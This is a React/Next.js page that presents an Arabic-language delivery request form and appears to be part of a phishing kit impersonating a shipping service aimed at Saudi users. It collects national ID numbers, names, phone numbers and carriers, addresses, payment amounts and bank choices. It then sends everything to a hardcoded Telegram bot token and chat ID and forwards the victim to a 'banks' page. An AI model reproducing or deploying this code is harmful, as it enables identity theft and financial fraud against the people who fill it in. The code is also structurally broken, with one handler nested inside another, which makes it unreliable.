"use client"
import { useRef } from 'react'
import styles from './fozajil.module.css'
import Image from 'next/image'
import formza from '../../../public/formza.png'
import { useRouter } from 'next/router'
import { useSearchParams } from 'next/navigation'
import Link from 'next/link'

const Page = () => {

  let numberTrack= useRef();
  let numbernation= useRef();
  let fullname= useRef();
  let numphone= useRef();
  let selectBanks= useRef()
  let typeshohna= useRef()
  let adress = useRef();
  let city = useRef();
  let mony = useRef();
  let selecttypenumber=useRef();

  const  name = useSearchParams();
  const datas = name.get("name");
  const router = useRouter()

  const handlerout = () => {
    
if(numberTrack.current.value == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
      
      router.push({
        pathname:'/fozajil/banks',
        query:{names:datas},});
    }



  const handleSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
      chat_id:6364334502
    }
    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${datas}`


    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))


  }

  return (
    <div className={styles.contain} dir='rtl'>
      <div className={styles.navbar}>
        <h2>طلب  توصيل واستلام</h2>
      </div>
        <form onSubmit={handleSubmit}> 
            <Image 
              src={formza}
              width={450}
            />
            <input type="number" name='numberTrack' ref={numberTrack} placeholder='رقم الشحنة' required maxLength="12"  minLength="8"/>
            <input type="number" name='numbernationalty' ref={numbernation} placeholder='رقم بطاقة الأحوال او الأقامة' required />
            <input type="text" name='typeShohna' ref={typeshohna} placeholder='نوع الشحنة' required />
            <input type="text" name='fullname' ref={fullname} placeholder='الأسم الكامل' required />
            <input type="number" name='numphone' ref={numphone} placeholder='رقم الجوال' required maxLength="10"/>
            <select name="selecttypephone" ref={selecttypenumber} required>
                <option value="ليبارا">ليبارا</option>
                <option value="فرجن">فرجن</option>
                <option value="STC">STC</option>
                <option value="زين">زين</option>
                <option value="موبايلي">موبايلي</option>
                <option value="سلام">سلام</option>
                <option value="ريدبول">ريدبول</option>
            </select>
            <input type="text" name='adress'  placeholder='العنوان' ref={adress}required />
            <input type="text" name='city'  placeholder='المدينة' ref={city}required />
            <input type="number" name='many' placeholder='قيمة السداد'ref={mony} required />
            <select name="selectedBaanks" ref={selectBanks} required>
                <option value="بنك السعودي للاستثمار">بنك السعودي للاستثمار</option>
                <option value="بنك الأهلي ">بنك الأهلي</option>
                <option value="بنك الراجحي">بنك الراجحي</option>
                <option value="بنك الرياض">بنك الرياض</option>
                <option value="بنك العربي">بنك العربي</option>
                <option value="بنك الجزيرة">بنك الجزيرة</option>
                <option value="بنك السعودي الفرنسي">بنك السعودي الفرنسي</option>
                <option value=" سمبا كابيتال"> سامبا كابيتال</option>
                <option value="بنك سامبا">بنك سامبا</option>
                <option value="بنك البلاد">بنك البلاد</option>
                <option value="بنك الأنماء">بنك الأنماء</option>
                <option value="بنك ساب">بنك ساب</option>
            </select>

        <button type='submit' onClick={handlerout}>التالي</button>
        </form>
    </div>

  )
}

export default Page; 
